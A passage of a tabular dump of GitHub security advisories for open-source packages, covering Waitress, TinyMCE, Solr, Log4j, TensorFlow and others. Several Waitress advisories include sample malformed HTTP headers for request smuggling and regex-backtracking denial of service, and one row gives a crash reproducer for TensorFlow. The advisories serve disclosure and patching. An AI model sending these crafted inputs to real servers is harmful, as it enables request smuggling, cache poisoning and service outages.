* Reported by [Yaniv Nizry](https://twitter.com/ynizry) from the CxSCA AppSec group at Checkmarx

### For more information

If you have any questions or comments about this advisory:

* Open an issue at [https://github.com/mozilla/bleach/issues](https://github.com/mozilla/bleach/issues)
* Email us at [security@mozilla.org](mailto:security@mozilla.org)
",pip
900,15968,codecov,GHSA-5q88-cjfq-g2mh,CVE-2020-7597,https://github.com/advisories/GHSA-5q88-cjfq-g2mh,high,2020-02-19 17:29:39 UTC,codecov NPM module allows remote attackers to execute arbitrary commands,codecov-node npm module before 3.6.5 allows remote attackers to execute arbitrary commands.The value provided as part of the gcov-root argument is executed by the exec function within lib/codecov.js. This vulnerability exists due to an incomplete fix of CVE-2020-7596.,npm
901,18823,nokogiri,GHSA-7553-jr98-vx47,CVE-2020-7595,https://github.com/advisories/GHSA-7553-jr98-vx47,high,2020-02-24 19:12:36 UTC,libxml as used in Nokogiri has an infinite loop in a certain end-of-file situation,"xmlStringLenDecodeEntities in parser.c in libxml2 2.9.10 has an infinite loop in a certain end-of-file situation.
The Nokogiri RubyGem has patched its vendored copy of libxml2 in order to prevent this issue from affecting nokogiri.",rubygems
902,16827,yarn,GHSA-5xf4-f2fq-f69j,CVE-2019-10773,https://github.com/advisories/GHSA-5xf4-f2fq-f69j,high,2020-02-14 23:10:16 UTC,Improper link resolution before file access (Link Following),"In Yarn before 1.21.1, the package install functionality can be abused to generate arbitrary symlinks on the host filesystem by using specially crafted ""bin"" keys. Existing files could be overwritten depending on the current user permission set.",npm
903,26796,bibtex-ruby,GHSA-c5r5-7pfh-6qg6,CVE-2019-10780,https://github.com/advisories/GHSA-c5r5-7pfh-6qg6,critical,2020-02-14 23:10:01 UTC,OS command injection in BibTeX-Ruby,BibTeX-ruby before 5.1.0 allows shell command injection due to unsanitized user input being passed directly to the built-in Ruby Kernel.open method through BibTeX.open.,rubygems
904,16174,angular,GHSA-r5fx-8r73-v86c,CVE-2019-14863,https://github.com/advisories/GHSA-r5fx-8r73-v86c,moderate,2020-02-14 23:08:49 UTC,AngularJS Cross-site Scripting due to failure to sanitize `xlink.href` attributes,"Versions of `angular` prior to 1.5.0-beta.1 are vulnerable to Cross-Site Scripting. The package fails to sanitize `xlink:href` attributes, which may allow attackers to execute arbitrary JavaScript in a victim's browser if the value is user-controlled.


## Recommendation

Upgrade to version 1.5.0-beta.1 or later.",npm
905,34577,org.apache.solr:solr-core,GHSA-ww97-9w65-2crx,CVE-2019-17558,https://github.com/advisories/GHSA-ww97-9w65-2crx,moderate,2020-02-12 18:45:28 UTC,Improper Input Validation in Apache Solr,"Apache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code Execution through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/` directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled` by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user).",maven
906,34422,org.apache.shiro:shiro-core,GHSA-r679-m633-g7wc,CVE-2019-12422,https://github.com/advisories/GHSA-r679-m633-g7wc,moderate,2020-02-04 22:36:36 UTC,Improper input validation in Apache Shiro,"Apache Shiro before 1.4.2, when using the default ""remember me"" configuration, cookies could be susceptible to a padding attack.",maven
907,33940,org.codehaus.jackson:jackson-mapper-asl,GHSA-r6j9-8759-g62w,CVE-2019-10172,https://github.com/advisories/GHSA-r6j9-8759-g62w,high,2020-02-04 22:39:19 UTC,Improper Restriction of XML External Entity Reference in jackson-mapper-asl,A flaw was found in org.codehaus.jackson:jackson-mapper-asl:1.9.x libraries. XML external entity vulnerabilities similar to CVE-2016-3720 also affects codehaus jackson-mapper-asl libraries but in different classes.,maven
908,20080,waitress,GHSA-73m2-3pwg-5fgc,CVE-2020-5236,https://github.com/advisories/GHSA-73m2-3pwg-5fgc,critical,2020-02-04 03:07:31 UTC,Catastrophic backtracking in regex allows Denial of Service in Waitress,"### Impact

When waitress receives a header that contains invalid characters it will cause the regular expression engine to catastrophically backtrack causing the process to use 100% CPU time and blocking any other interactions.

This would allow an attacker to send a single request with an invalid header and take the service offline.

Invalid header example:

```
Bad-header: xxxxxxxxxxxxxxx\x10
```

Increasing the number of `x`'s in the header will increase the amount of time Waitress spends in the regular expression engine.

This issue was introduced in version 1.4.2 when the regular expression was updated to attempt to match the behaviour required by errata associated with RFC7230.

### Patches

The regular expression that is used to validate incoming headers has been updated in version 1.4.3, it is recommended that people upgrade to the new version of Waitress as soon as possible.

### Workarounds

If you have deployed a reverse proxy in front of Waitress it may already be rejecting requests that include invalid headers.

### Thanks

The Pylons Project would like to thank [Fil Zembowicz](https://github.com/fzembow) for reaching out and disclosing this vulnerability!

### References

Catastrophic backtracking explained: https://www.regular-expressions.info/catastrophic.html

### For more information
If you have any questions or comments about this advisory:

- open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
- email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
909,34940,com.puppycrawl.tools:checkstyle,GHSA-763g-fqq7-48wg,CVE-2019-10782,https://github.com/advisories/GHSA-763g-fqq7-48wg,moderate,2020-01-31 18:00:07 UTC,XML external entity (XXE) processing ('external-parameter-entities' feature was not fully disabled)),"Due to an incomplete fix for [CVE-2019-9658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9658), checkstyle was still vulnerable to XML External Entity (XXE) Processing.

### Impact

#### User: Build Maintainers

This vulnerability probably doesn't impact Maven/Gradle users as, in most cases, these builds are processing files that are trusted, or pre-vetted by a pull request reviewer before being run on internal CI infrastructure.

#### User: Static Analysis as a Service

If you operate a site/service that parses ""untrusted"" Checkstyle XML configuration files, you are vulnerable to this and should patch.

Note from the discoverer of the original CVE-2019-9658:

> While looking at a few companies that run Checkstyle/PMD/ect... as a service I notice that it's a common pattern to run the static code analysis tool inside of a Docker container with the following flags:
> ```
> --net=none \
> --privileged=false \
> --cap-drop=ALL
> ```
> Running the analysis in Docker has the advantage that there should be no sensitive local file information that XXE can exfiltrate from the container. Additionally, these flags prevent vulnerabilities in static analysis tools like Checkstyle from being used to exfiltrate data via XXE or to perform SSRF.
> \- [Jonathan Leitschuh](https://twitter.com/jlleitschuh)

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Patched, will be released with version 8.29 at 26 Jan 2020.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

No workaround are available

### References

 - [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
 - GitHub Issue https://github.com/checkstyle/checkstyle/issues/7468

### For more information

If you have any questions or comments about this advisory:
* Open an issue in https://github.com/checkstyle/checkstyle/issues
",maven
910,18135,tinymce,GHSA-27gm-ghr9-4v95,,https://github.com/advisories/GHSA-27gm-ghr9-4v95,high,2020-01-30 21:22:15 UTC,Cross-site scripting vulnerability in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in: the core parser, `paste` and `visualchars` plugins. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.6 or lower and TinyMCE 5.1.3 or lower.

### Patches
This vulnerability has been patched in TinyMCE 4.9.7 and 5.1.4 by improved parser logic and HTML sanitization.

### Workarounds
The workarounds available are:
- disable the impacted plugins
- manually sanitize the content using the `BeforeSetContent` event (see below)
- upgrade to either TinyMCE 4.9.7 or TinyMCE 5.1.4

#### Example: Manually sanitize content
```js
editor.on('BeforeSetContent', function(e) {
  var sanitizedContent = ...; // Manually sanitize content here
  e.content = sanitizedContent;
});
```

### Acknowledgements
Tiny Technologies would like to thank Michał Bentkowski for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes514/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)
",npm
911,20768,feedgen,GHSA-g8q7-xv52-hf9f,CVE-2020-5227,https://github.com/advisories/GHSA-g8q7-xv52-hf9f,high,2020-01-28 22:37:50 UTC,Feedgen Vulnerable to XML Denial of Service Attacks,"### Impact

The *feedgen* library allows supplying XML as content for some of the available fields. This XML will be parsed and integrated into the existing XML tree. During this process, feedgen is vulnerable to [XML Denial of Service Attacks](https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses) (e.g. XML Bomb).

This becomes a concern in particular if feedgen is used to include content from untrused sources and if XML (including XHTML) is directly included instead of providing plain tex content only.

### Patches

This problem has been fixed in feedgen 0.9.0 which disallows XML entity expansion and external resources.

### Workarounds

Updating is strongly recommended and should not be problematic. Nevertheless, as a workaround, avoid providing XML directly to feedgen or ensure that no entity expansion is part of the XML. 

### References

- [Security Briefs - XML Denial of Service Attacks and Defenses](https://docs.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses)
- [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack#cite_note-2)

### For more information

If you have any questions or comments about this advisory:
- Open an issue in [lkiesow/python-feedgen](https://github.com/lkiesow/python-feedgen/issues)
- Send an email to security@lkiesow.de",pip
912,34577,org.apache.solr:solr-core,GHSA-2289-pqfq-6wx7,CVE-2019-12409,https://github.com/advisories/GHSA-2289-pqfq-6wx7,critical,2020-01-28 22:26:54 UTC,Unrestricted upload of file with dangerous type in Apache Solr,"The 8.1.1 and 8.2.0 releases of Apache Solr contain an insecure setting for the ENABLE_REMOTE_JMX_OPTS configuration option in the default solr.in.sh configuration file shipping with Solr. If you use the default solr.in.sh file from the affected releases, then JMX monitoring will be enabled and exposed on RMI_PORT (default=18983), without any authentication. If this port is opened for inbound traffic in your firewall, then anyone with network access to your Solr nodes will be able to access JMX, which may in turn allow them to upload malicious code for execution on the Solr server.",maven
913,20741,tensorflow,GHSA-977j-xj7q-2jr9,CVE-2020-5215,https://github.com/advisories/GHSA-977j-xj7q-2jr9,high,2020-01-28 21:32:29 UTC,Segmentation faultin TensorFlow when converting a Python string to `tf.float16`,"### Impact

Converting a string (from Python) to a `tf.float16` value results in a segmentation fault in eager mode as the format checks for this use case are only in the graph mode.

This issue can lead to denial of service in inference/training where a malicious attacker can send a data point which contains a string instead of a `tf.float16` value.

Similar effects can be obtained by manipulating saved models and checkpoints whereby replacing a scalar `tf.float16` value with a scalar string will trigger this issue due to automatic conversions.

This can be easily reproduced by `tf.constant(""hello"", tf.float16)`, if eager execution is enabled.

### Patches
We have patched the vulnerability in GitHub commit [5ac1b9](https://github.com/tensorflow/tensorflow/commit/5ac1b9e24ff6afc465756edf845d2e9660bd34bf).

We are additionally releasing TensorFlow 1.15.1 and 2.0.1 with this vulnerability patched.

TensorFlow 2.1.0 was released after we fixed the issue, thus it is not affected.

We encourage users to switch to TensorFlow 1.15.1, 2.0.1 or 2.1.0.

### For more information

Please consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
914,36737,io.ratpack:ratpack-core,GHSA-r2wf-q3x4-hrv9,CVE-2019-10770,https://github.com/advisories/GHSA-r2wf-q3x4-hrv9,moderate,2020-01-27 19:28:20 UTC,Default development error handler in Ratpack is vulnerable to HTML content injection (XSS),"Versions of Ratpack from 0.9.10 through 1.7.5 are vulnerable to [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html) (aka. XSS) in the development error handler. An attacker can utilize this to perform XSS when an exception message contains untrusted data.

As a simplistic example:
```java
RatpackServer startedServer = RatpackServer.start(server -> {
    server.handlers(chain -> chain.all(ctx -> {
        // User supplied query parameter
        String message = ctx.getRequest().getQueryParams().get(""message"");
        // User supplied data appended to the message in an exception
        throw new RuntimeException(""An error occurred: "" + message);
    }));
});
```

### Impact

 - Cross-Site Scripting

### Patches

This vulnerability has been patched in Ratpack version 1.7.6.

### Workarounds

If you are unable to update your version of Ratpack, we recommend the following workarounds and mitigations.

 - Ensure that development mode is disabled in production.
 - Don't use real customer data (ie. untrusted user input) in development.

### References

 - [Ratpack development mode](https://ratpack.io/manual/current/api/ratpack/server/ServerConfigBuilder.html#development-boolean-)
 - [Code Patch - a3cbb13](https://github.com/ratpack/ratpack/commit/a3cbb13be1527874528c3b99fc33517c0297b6d3)

### For more information

If you have any questions or comments about this advisory:
 - Open an issue in [ratpack/ratpack](https://github.com/ratpack/ratpack/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc)
 - Ask in our [Slack channel](https://slack-signup.ratpack.io/)
",maven
915,34977,org.infinispan:infinispan-core,GHSA-6x3v-rw2q-9gx7,CVE-2019-10158,https://github.com/advisories/GHSA-6x3v-rw2q-9gx7,critical,2020-01-21 21:18:44 UTC,Improper implementation of the session fixation protection in Infinispan,A flaw was found in Infinispan through version 9.4.14.Final. An improper implementation of the session fixation protection in the Spring Session integration can result in incorrect session handling.,maven
916,33936,org.springframework:spring-webmvc,GHSA-7pm4-g2qj-j85x,CVE-2020-5397,https://github.com/advisories/GHSA-7pm4-g2qj-j85x,moderate,2020-01-21 20:59:33 UTC,CSRF attack via CORS preflight requests with Spring MVC or Spring WebFlux,"Spring Framework, versions 5.2.x prior to 5.2.3 are vulnerable to CSRF attacks through CORS preflight requests that target Spring MVC (spring-webmvc module) or Spring WebFlux (spring-webflux module) endpoints. Only non-authenticated endpoints are vulnerable because preflight requests should not include credentials and therefore requests should fail authentication. However a notable exception to this are Chrome based browsers when using client certificates for authentication since Chrome sends TLS client certificates in CORS preflight requests in violation of spec requirements. No HTTP body can be sent or received as a result of this attack.",maven
917,33936,org.springframework:spring-webmvc,GHSA-8wx2-9q48-vm9r,CVE-2020-5398,https://github.com/advisories/GHSA-8wx2-9q48-vm9r,high,2020-01-21 20:59:09 UTC,RFD attack via Content-Disposition header sourced from request input by Spring MVC or Spring WebFlux Application,"In Spring Framework, versions 5.2.x prior to 5.2.3, versions 5.1.x prior to 5.1.13, and versions 5.0.x prior to 5.0.16, an application is vulnerable to a reflected file download (RFD) attack when it sets a ""Content-Disposition"" header in the response where the filename attribute is derived from user supplied input.",maven
918,19964,validators,GHSA-5qcg-w2cc-xffw,CVE-2019-19588,https://github.com/advisories/GHSA-5qcg-w2cc-xffw,high,2020-01-21 20:32:09 UTC,Uncontrolled resource consumption in validators Python package,The validators package 0.12.2 through 0.12.5 for Python enters an infinite loop when validators.domain is called with a crafted domain string. This is fixed in 0.12.6.,pip
919,35023,org.hibernate.validator:hibernate-validator,GHSA-m8p2-495h-ccmh,CVE-2019-10219,https://github.com/advisories/GHSA-m8p2-495h-ccmh,moderate,2020-01-08 17:01:52 UTC,The SafeHtml annotation in Hibernate-Validator does not properly guard against XSS attacks,A vulnerability was found in Hibernate-Validator. The SafeHtml validator annotation fails to properly sanitize payloads consisting of potentially malicious code in HTML comments and instructions. This vulnerability can result in an XSS attack.,maven
920,20237,PyInstaller,GHSA-7fcj-pq9j-wh2r,CVE-2019-16784,https://github.com/advisories/GHSA-7fcj-pq9j-wh2r,high,2020-01-16 22:18:27 UTC,Local Privilege Escalation in PyInstaller,"### Impact

Local Privilege Escalation in all Windows software frozen by PyInstaller in ""onefile"" mode.

The vulnerability is present only on Windows and in this particular case: If a **software frozen by PyInstaller in ""onefile"" mode** is launched by a (privileged) user who has **his/her ""TempPath"" resolving to a world writable directory**. This is the case e.g. if the software is launched as a service or as a scheduled task using a system account (in which case TempPath will default to C:\Windows\Temp).

In order to be exploitable the software has to be (re)started after the attacker has launched the exploit program. So for a service launched at startup, a service restart is needed (e.g. after a crash or an upgrade).

While PyInstaller itself was not vulnerable, all Windows software frozen by PyInstaller in ""onefile"" mode is vulnerable.

CVSSv3 score 7.0 (High)
CVSSv3 vector CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

Affected
- all Windows software frozen by PyInstaller in ""onefile"" mode

No affected
- PyInstaller itself (except if frozen by PyInstaller in ""onefile"" mode on Windows)
- software frozen in ""one*dir*"" mode
- other platforms (GNU/Linux, OS X, BSD, etc.)

### Patches
The problem is patched in commits 42a67148b3bdf9211fda8499fdc5b63acdd7e6cc (fixed code) and be948cf0954707671aa499da17b10c86b6fa5e5c (recompiled bootloaders). Users should upgrade to PyInstaller version 3.6 and rebuild their software.

### Workarounds
There is no known workaround. Users using PyInstaller to freeze their Windows software using ""onefile"" mode should upgrade PyInstaller and rebuild their software.

### Credits
This vulnerability was discovered and reported by Farid AYOUJIL (@faridtsl), David HA, Florent LE NIGER and Yann GASCUEL (@lnv42) from Alter Solutions (@AlterSolutions) and fixed in collaboration with
Hartmut Goebel (@htgoebel, maintainer of PyInstaller).

### Funding Development

PyInstaller is in urgent need of funding to make future security fixes happen, see <https://github.com/pyinstaller/pyinstaller/issues/4404> for details.",pip
921,20080,waitress,GHSA-968f-66r5-5v74,CVE-2019-16789,https://github.com/advisories/GHSA-968f-66r5-5v74,high,2020-01-06 18:44:21 UTC,HTTP Request Smuggling in Waitress: Invalid whitespace characters in headers (Follow-up),"### Impact

The patches introduced to fix https://github.com/Pylons/waitress/security/advisories/GHSA-m5ff-3wj3-8ph4 were not complete and still would allow an attacker to smuggle requests/split a HTTP request with invalid data.

This updates the existing CVE with ID: CVE-2019-16789

### Patches

Waitress version 1.4.2 has been updated to now validate HTTP headers better to avoid the issue, completely fixing all known issues with whitespace.

### Workarounds

There are no work-arounds, upgrading to Waitress 1.4.2 is highly recommended.

### References

See https://github.com/Pylons/waitress/security/advisories/GHSA-m5ff-3wj3-8ph4 for more information on the security issue.

### For more information

If you have any questions or comments about this advisory:

* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
922,18266,cookie-signature,GHSA-92vm-wfm5-mxvv,CVE-2016-1000236,https://github.com/advisories/GHSA-92vm-wfm5-mxvv,moderate,2020-01-06 18:44:10 UTC,cookie-signature Timing Attack,"Affected versions of `cookie-signature` are vulnerable to timing attacks as a result of using a fail-early comparison instead of a constant-time comparison. 

Timing attacks remove the exponential increase in entropy gained from increased secret length, by providing per-character feedback on the correctness of a guess via miniscule timing differences.

Under favorable network conditions, an attacker can exploit this to guess the secret in no more than `charset*length` guesses, instead of `charset^length` guesses required were the timing attack not present. 



## Recommendation

Update to 1.0.4 or later.",npm
923,33876,log4j:log4j,GHSA-2qrg-x229-3v8q,CVE-2019-17571,https://github.com/advisories/GHSA-2qrg-x229-3v8q,critical,2020-01-06 18:43:49 UTC,Deserialization of Untrusted Data in Log4j,"Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.

Users are advised to migrate to `org.apache.logging.log4j:log4j-core`",maven
924,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-hh3j-x4mc-g48r,CVE-2019-12418,https://github.com/advisories/GHSA-hh3j-x4mc-g48r,high,2019-12-26 18:22:36 UTC,Insufficiently Protected Credentials in Apache Tomcat,"When Apache Tomcat 9.0.0.M1 to 9.0.28, 8.5.0 to 8.5.47, 7.0.0 and 7.0.97 is configured with the JMX Remote Lifecycle Listener, a local attacker without access to the Tomcat process or configuration files is able to manipulate the RMI registry to perform a man-in-the-middle attack to capture user names and passwords used to access the JMX interface. The attacker can then use these credentials to access the JMX interface and gain complete control over the Tomcat instance.",maven
925,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-9xcj-c8cr-8c3c,CVE-2019-17563,https://github.com/advisories/GHSA-9xcj-c8cr-8c3c,high,2019-12-26 18:22:26 UTC,"In Apache Tomcat, when using FORM authentication there was a narrow window where an attacker could perform a session fixation attack","When using FORM authentication with Apache Tomcat 9.0.0.M1 to 9.0.29, 8.5.0 to 8.5.49 and 7.0.0 to 7.0.98 there was a narrow window where an attacker could perform a session fixation attack. The window was considered too narrow for an exploit to be practical but, erring on the side of caution, this issue has been treated as a security vulnerability.",maven
926,16013,handlebars,GHSA-w457-6q6x-cgp9,CVE-2019-19919,https://github.com/advisories/GHSA-w457-6q6x-cgp9,critical,2019-12-26 17:58:13 UTC,Prototype Pollution in handlebars,"Versions of `handlebars` prior to 3.0.8 or 4.3.0 are vulnerable to Prototype Pollution leading to Remote Code Execution. Templates may alter an Objects' `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code through crafted payloads.


## Recommendation

Upgrade to version 3.0.8, 4.3.0 or later.",npm
927,20080,waitress,GHSA-m5ff-3wj3-8ph4,,https://github.com/advisories/GHSA-m5ff-3wj3-8ph4,high,2019-12-26 16:34:38 UTC,HTTP Request Smuggling: Invalid whitespace characters in headers in Waitress,"### Impact

If a proxy server is used in front of waitress, an invalid request may be sent by an attacker that bypasses the front-end and is parsed differently by waitress leading to a potential for HTTP request smuggling.

```
Content-Length: 10
Transfer-Encoding: [\x0b]chunked
```

For clarity:

```
0x0b == vertical tab
```

Would get parsed by Waitress as being a `chunked` request, but a front-end server would use the `Content-Length` instead as the `Transfer-Encoding` header is considered invalid due to containing invalid characters.

If a front-end server does HTTP pipelining to a backend Waitress server this could lead to HTTP request splitting which may lead to potential cache poisoning or unexpected information disclosure.

### Patches

Please upgrade to Waitress 1.4.1 which fixes this issue with stricter HTTP field validation.

Waitress 1.4.1 due to this change has become much more strict in what is allowed in header values, while the maintainers don't believe that these changes will cause any issues, it may cause failures with non-conformist reverse proxies or clients, and it is highly recommend that users validate the changes in their environment and make sure it won't cause any unacceptable failures.

### Workarounds

You may enable additional protections on front-end servers, those that follow RFC7230 correctly would drop the request with a 400 Bad Request.

Waitress will now correctly responds to the request with a 400 Bad Request, and will drop the connection to avoid any potential HTTP pipelining issues.

### References

This was mentioned in https://portswigger.net/research/http-desync-attacks-what-happened-next and was specifically mentioned as being an issue in HAProxy which did not properly filter it in this article: https://nathandavison.com/blog/haproxy-http-request-smuggling

### Thanks

The Pylons Project would like to thank ZeddYu Lu for doing extended testing against Waitress 1.4.0 and bringing this to our attention!

### For more information

If you have any questions or comments about this advisory:

* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
928,20080,waitress,GHSA-4ppp-gpcr-7qf6,,https://github.com/advisories/GHSA-4ppp-gpcr-7qf6,critical,2019-12-20 23:04:35 UTC,HTTP Request Smuggling: Content-Length Sent Twice in Waitress,"### Impact

Waitress would header fold a double `Content-Length` header and due to being unable to cast the now comma separated value to an integer would set the `Content-Length` to 0 internally.

So a request with:

```
Content-Length: 10
Content-Length: 10
```

would get transformed to:

```
Content-Length: 10, 10
```

Which would Waitress would then internally set to `Content-Lenght: 0`.

Waitress would then treat the request as having no body, thereby treating the body of the request as a new request in HTTP pipelining.

### Patches

This issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. 

The Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don't cause any changes in behavior.

### Workarounds

Various reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn't use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method).

### Issues/more security issues:

* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
929,20080,waitress,GHSA-g2xc-35jw-c63p,CVE-2019-16786,https://github.com/advisories/GHSA-g2xc-35jw-c63p,high,2019-12-20 23:04:18 UTC,HTTP Request Smuggling: Invalid Transfer-Encoding in Waitress,"### Impact

Waitress would parse the `Transfer-Encoding` header and only look for a single string value, if that value was not `chunked` it would fall through and use the `Content-Length` header instead.

According to the HTTP standard `Transfer-Encoding` should be a comma separated list, with the inner-most encoding first, followed by any further transfer codings, ending with `chunked`.

Requests sent with:

```
Transfer-Encoding: gzip, chunked
```

Would incorrectly get ignored, and the request would use a `Content-Length` header instead to determine the body size of the HTTP message.

This could allow for Waitress to treat a single request as multiple requests in the case of HTTP pipelining.

### Patches

This issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. 

Waitress will now return a 501 Not Implemented error if the `Transfer-Encoding` is not `chunked` or contains multiple elements. Waitress does not support any transfer codings such as `gzip` or `deflate`.

The Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don&#39;t cause any changes in behavior.

### Workarounds

Various reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn&#39;t use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method).

### Issues/more security issues:

* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
930,20080,waitress,GHSA-pg36-wpm5-g57p,CVE-2019-16785,https://github.com/advisories/GHSA-pg36-wpm5-g57p,high,2019-12-20 23:03:57 UTC,HTTP Request Smuggling: LF vs CRLF handling in Waitress,"### Impact

Waitress implemented a &amp;quot;MAY&amp;quot; part of the RFC7230 (https://tools.ietf.org/html/rfc7230#section-3.5) which states:

      Although the line terminator for the start-line and header fields is
      the sequence CRLF, a recipient MAY recognize a single LF as a line
      terminator and ignore any preceding CR.

Unfortunately if a front-end server does not parse header fields with an LF the same way as it does those with a CRLF it can lead to the front-end and the back-end server parsing the same HTTP message in two different ways. This can lead to a potential for HTTP request smuggling/splitting whereby Waitress may see two requests while the front-end server only sees a single HTTP message.

Example:

```
Content-Length: 100[CRLF]
X-Header: x[LF]Content-Length: 0[CRLF]
```

Would get treated by Waitress as if it were:

```
Content-Length: 100
X-Header: x
Content-Length: 0
```

This could potentially get used by attackers to split the HTTP request and smuggle a second request in the body of the first.


### Patches

This issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. 

Waitress no longer implements the MAY part of the specification and instead requires that all lines are terminated correctly with CRLF. If any lines are found with a bare CR or LF a 400 Bad Request is sent back to the requesting entity.

The Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don&amp;#39;t cause any changes in behavior.

### Workarounds

Various reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn&amp;#39;t use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method)

### Issues/more security issues:

* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",pip
931,18839,rack,GHSA-hrqr-hxpp-chr3,CVE-2019-16782,https://github.com/advisories/GHSA-hrqr-hxpp-chr3,moderate,2019-12-18 19:01:31 UTC,Possible Information Leak / Session Hijack Vulnerability in Rack,"There's a possible information leak / session hijack vulnerability in Rack. Attackers may be able to find and hijack sessions by using timing attacks targeting the session id. Session ids are usually stored and indexed in a database that uses some kind of scheme for speeding up lookups of that session id. By carefully measuring the amount of time it takes to look up a session, an attacker may be able to find a valid session id and hijack the session.

The session id itself may be generated randomly, but the way the session is indexed by the backing store does not use a secure comparison.

### Impact

The session id stored in a cookie is the same id that is used when querying the backing session storage engine.  Most storage mechanisms (for example a database) use some sort of indexing in order to speed up the lookup of that id.  By carefully timing requests and session lookup failures, an attacker may be able to perform a timing attack to determine an existing session id and hijack that session.

## Releases

The 1.6.12 and 2.0.8 releases are available at the normal locations.

### Workarounds

There are no known workarounds.

### Patches

To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 1-6-session-timing-attack.patch - Patch for 1.6 series
* 2-0-session-timing-attack.patch - Patch for 2.6 series

### Credits

Thanks Will Leinweber for reporting this!",rubygems
932,20741,tensorflow,GHSA-844w-j86r-4x2j,CVE-2019-16778,https://github.com/advisories/GHSA-844w-j86r-4x2j,low,2019-12-16 20:17:10 UTC,Heap buffer overflow in `UnsortedSegmentSum` in TensorFlow,"### Impact

A heap buffer overflow in `UnsortedSegmentSum` can be produced when the `Index` template argument is `int32`. In this case `data_size` and `num_segments` fields are truncated from `int64` to `int32` and can produce negative numbers, resulting in accessing out of bounds heap memory.

This is unlikely to be exploitable and was detected and fixed internally. We are making the security advisory only to notify users that it is better to update to TensorFlow 1.15 or 2.0 or later as these versions already have this fixed.

### Patches

Patched by db4f9717c41bccc3ce10099ab61996b246099892 and released in all official releases after 1.15 and 2.0.

### For more information
Please consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
933,18969,excon,GHSA-q58g-455p-8vw9,CVE-2019-16779,https://github.com/advisories/GHSA-q58g-455p-8vw9,moderate,2019-12-16 19:30:17 UTC,"In RubyGem excon, interrupted Persistent Connections May Leak Response Data","### Impact
There was a race condition around persistent connections, where a connection which is interrupted (such as by a timeout) would leave data on the socket. Subsequent requests would then read this data, returning content from the previous response. The race condition window appears to be short, and it would be difficult to purposefully exploit this.

### Patches
